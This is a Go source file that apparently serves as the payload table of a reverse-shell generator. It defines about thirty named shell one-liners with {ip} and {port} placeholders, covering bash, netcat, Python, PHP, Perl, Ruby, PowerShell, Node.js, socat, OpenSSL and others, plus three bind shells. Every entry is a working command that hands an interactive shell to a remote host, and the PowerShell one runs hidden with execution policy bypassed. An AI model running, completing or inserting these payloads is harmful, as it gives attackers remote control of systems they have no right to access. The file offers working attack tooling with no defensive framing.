package main

var EmbeddedShells = []Shell{
	{
		Name:    "Bash -i (TCP)",
		Command: "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
		Meta:    []string{"linux", "bash", "ReverseShell"},
	},
	{
		Name:    "Bash 196",
		Command: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196",
		Meta:    []string{"linux", "bash", "ReverseShell"},
	},
	{
		Name:    "Bash 5",
		Command: "/bin/bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
		Meta:    []string{"linux", "bash", "ReverseShell"},
	},
	{
		Name:    "Bash udp",
		Command: "/bin/bash -i >& /dev/udp/{ip}/{port} 0>&1",
		Meta:    []string{"linux", "bash", "ReverseShell"},
	},
	{
		Name:    "nc mkfifo",
		Command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
		Meta:    []string{"linux", "nc", "ReverseShell"},
	},
	{
		Name:    "nc -e",
		Command: "nc {ip} {port} -e /bin/sh",
		Meta:    []string{"linux", "nc", "ReverseShell"},
	},
	{
		Name:    "nc -c",
		Command: "nc {ip} {port} -c /bin/sh",
		Meta:    []string{"linux", "nc", "ReverseShell"},
	},
	{
		Name:    "nc.exe -e (Win)",
		Command: "nc.exe {ip} {port} -e cmd.exe",
		Meta:    []string{"windows", "nc", "ReverseShell"},
	},
	{
		Name:    "BusyBox nc -e",
		Command: "busybox nc {ip} {port} -e /bin/sh",
		Meta:    []string{"linux", "nc", "ReverseShell"},
	},
	{
		Name:    "ncat -e",
		Command: "ncat {ip} {port} -e /bin/sh",
		Meta:    []string{"linux", "ncat", "ReverseShell"},
	},
	{
		Name:    "ncat (UDP)",
		Command: "ncat -u {ip} {port} -e /bin/sh",
		Meta:    []string{"linux", "ncat", "ReverseShell"},
	},
	{
		Name:    "Python3 (pty)",
		Command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
		Meta:    []string{"linux", "python", "ReverseShell"},
	},
	{
		Name:    "Python3 (Subprocess)",
		Command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
		Meta:    []string{"linux", "python", "ReverseShell"},
	},
	{
		Name:    "PHP exec",
		Command: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
		Meta:    []string{"linux", "php", "ReverseShell"},
	},
	{
		Name:    "PHP system",
		Command: "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
		Meta:    []string{"linux", "php", "ReverseShell"},
	},
	{
		Name:    "Ruby #1",
		Command: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
		Meta:    []string{"linux", "ruby", "ReverseShell"},
	},
	{
		Name:    "Ruby (No Sh)",
		Command: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
		Meta:    []string{"linux", "ruby", "ReverseShell"},
	},
	{
		Name:    "socat (TTY)",
		Command: "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
		Meta:    []string{"linux", "socat", "ReverseShell"},
	},
	{
		Name:    "Perl",
		Command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
		Meta:    []string{"linux", "perl", "ReverseShell"},
	},
	{
		Name:    "Perl (No Sh)",
		Command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
		Meta:    []string{"linux", "perl", "ReverseShell"},
	},
	{
		Name:    "PowerShell (TCP)",
		Command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
		Meta:    []string{"windows", "powershell", "ReverseShell"},
	},
	{
		Name:    "Node.js",
		Command: "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({port},\"{ip}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'",
		Meta:    []string{"linux", "node", "ReverseShell"},
	},
	{
		Name:    "Node.js (Groovy)",
		Command: "node -e 'require(\"child_process\").exec(\"nc -e /bin/sh {ip} {port}\")'",
		Meta:    []string{"linux", "node", "ReverseShell"},
	},
	{
		Name:    "Telnet mkfifo",
		Command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {ip} {port} >/tmp/f",
		Meta:    []string{"linux", "telnet", "ReverseShell"},
	},
	{
		Name:    "Awk",
		Command: "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s) }}'",
		Meta:    []string{"linux", "awk", "ReverseShell"},
	},
	{
		Name:    "Lua",
		Command: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
		Meta:    []string{"linux", "lua", "ReverseShell"},
	},
	{
		Name:    "Golang",
		Command: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
		Meta:    []string{"linux", "go", "ReverseShell"},
	},
	{
		Name:    "OpenSSL",
		Command: "rm /tmp/s;mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
		Meta:    []string{"linux", "openssl", "ReverseShell"},
	},
	{
		Name:    "Java",
		Command: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
		Meta:    []string{"linux", "java", "ReverseShell"},
	},
	{
		Name:    "Python3 Bind",
		Command: "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
		Meta:    []string{"bind", "python", "BindShell"},
	},
	{
		Name:    "nc Bind",
		Command: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
		Meta:    []string{"bind", "nc", "BindShell"},
	},
	{
		Name:    "Perl Bind",
		Command: "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,5);$s=accept($ns,S);open(STDIN,\">&\" . fileno($ns));open(STDOUT,\">&\" . fileno($ns));open(STDERR,\">&\" . fileno($ns));exec(\"/bin/sh -i\");'",
		Meta:    []string{"bind", "perl", "BindShell"},
	},
}
